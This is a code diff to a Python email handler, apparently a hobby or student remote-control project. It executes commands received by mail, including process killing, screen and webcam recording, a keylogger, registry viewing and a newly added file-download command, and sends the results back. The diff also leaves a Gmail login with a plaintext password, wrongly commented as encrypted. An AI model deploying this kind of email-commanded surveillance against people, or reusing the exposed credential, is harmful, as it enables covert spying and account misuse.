@@ -9,7 +9,6 @@ from email import encoders
 from textwrap import dedent
 from email import encoders
 
-
 import os
 
 
@@ -23,7 +22,8 @@ DEFAULT_USERNAME = 'receiverimap002@gmail.com'
 DEFAULT_PASSWORD = 'orkphlqjqbsnrvin'  # encrypted password using JSON
 
 # TRUSTED SENDERS
-TRUSTED_SENDERS = ['sendersmtp001@gmail.com', 'nguyenhieu82132@gmail.com']  # encrypted using JSON
+TRUSTED_SENDERS = ['sendersmtp001@gmail.com',
+                   'nguyenhieu82132@gmail.com']  # encrypted using JSON
 
 # SUBJECCT
 RECOGNIZE_SUBJECT = 'RDM'
@@ -38,7 +38,7 @@ TEMPLATE_PATH = os.path.join('src', 'templates')
 TEMPLATE_FILE_NAMES = {'LIST PROCESS': 'list-process.html', 'KILL PROCESS': 'kill-process.html',
                        'LIST APP': 'list-app.html', 'KILL APP': 'kil-app.html', 'CAPTURE SCREEN': 'capture-screen.html',
                        'RECORD SCREEN': 'record-screen.html', 'SHOT WEBCAM': 'shot-webcam.html', 'RECORD WEBCAM': 'record-webcam.html',
-                       'VIEW FILE SYSTEM': 'file-system.html', 'REGISTRY': 'registry.html', 'KEYLOGGER': 'keylogger.html',
+                       'VIEW FILE SYSTEM': 'file-system.html', 'DOWNLOAD FILE SYSTEM': 'file-download.html', 'REGISTRY': 'registry.html', 'KEYLOGGER': 'keylogger.html',
                        'SHUTDOWN': 'shutdown.html', 'RESTART': 'restart.html'}
 
 
@@ -83,6 +83,7 @@ class Receiver():
                     mail_content += part.get_payload()
         else:
             mail_content = mail.get_payload()
+        mail_content = mail_content.replace('\r\n', '')
 
         print(f'From: {mail_from}')
         print(f'Subject: {mail_subject}')
@@ -123,7 +124,7 @@ class Receiver():
             TEMPLATE_PATH, TEMPLATE_FILE_NAMES[command])
         body_html = open(template)
         body_html = body_html.read()
-        
+
         if command == 'LIST PROCESS' or command == 'LIST APP':
             content_str = str(content)
             data_str = content_str.replace("\n", " ")
@@ -148,7 +149,8 @@ class Receiver():
             #  loop over our arrays and create our html string
             outputHTML = "<table>"
             for i in range(len(data)//3):
-                if i == 1: continue
+                if i == 1:
+                    continue
                 if i == 0:
                     outputHTML += "<tr class = \"header_table\">"
                 else:
@@ -168,16 +170,17 @@ class Receiver():
             outputHTML = "<ul><li class=\"root_dir\">{}<ul>".format(root)
             for i in range(len(content_list) - 1):
                 if os.path.isfile(os.path.join(root, content_list[i])):
-                    outputHTML += "<li class=\"child_dir_2\">" + content_list[i] + "</li>"
+                    outputHTML += "<li class=\"child_dir_2\">" + \
+                        content_list[i] + "</li>"
                 else:
-                    outputHTML += "<li class=\"child_dir_1\">" + content_list[i] + "</li>"
+                    outputHTML += "<li class=\"child_dir_1\">" + \
+                        content_list[i] + "</li>"
 
             outputHTML += "</ul></li></ul>"
             body_html = body_html.format(outputHTML)
         else:
-            body_html = body_html.format(content) 
+            body_html = body_html.format(content)
         # print(body_html)
-
 
         # attach
         # mail.attach(MIMEText(dedent(content), 'plain'))
@@ -185,12 +188,11 @@ class Receiver():
 
         # attach files
         file_name = None
-        if command in ['CAPTURE SCREEN', 'RECORD SCREEN', 'SHOT WEBCAM', 'RECORD WEBCAM']:
+        if command in ['CAPTURE SCREEN', 'RECORD SCREEN', 'SHOT WEBCAM', 'RECORD WEBCAM', 'DOWNLOAD FILE SYSTEM']:
             file_name = content
-
-        if file_name:
-            path = os.path.join('.temp', file_name)
-            mail.attach(self.attach_file(path))
+            if command != 'DOWNLOAD FILE SYSTEM':
+                file_name = os.path.join('.temp', file_name)
+                mail.attach(self.attach_file(file_name))
 
         return mail
 
@@ -201,10 +203,6 @@ class Receiver():
         log = 'Replied to “%s” for the mail “%s”' % (original['From'],
                                                      original['Subject'])
         print(log)
-        # try:
-        #     call(['notify-send', log])
-        # except FileNotFoundError:
-        #     pass
 
     def attach_file(self, file_name):
         try:
@@ -215,12 +213,13 @@ class Receiver():
             encoders.encode_base64(part)
 
             part.add_header("Content-Disposition",
-                            f"attachment; filename= {file_name}",)
+                            f"attachment; filename= {os.path.basename(file_name)}",)
 
             return part
 
         except Exception as e:
             print(f'Oh no! We didn\'t found the attachment!\n{e}')
+            return None
 
     def quit(self):
         self.server.quit()
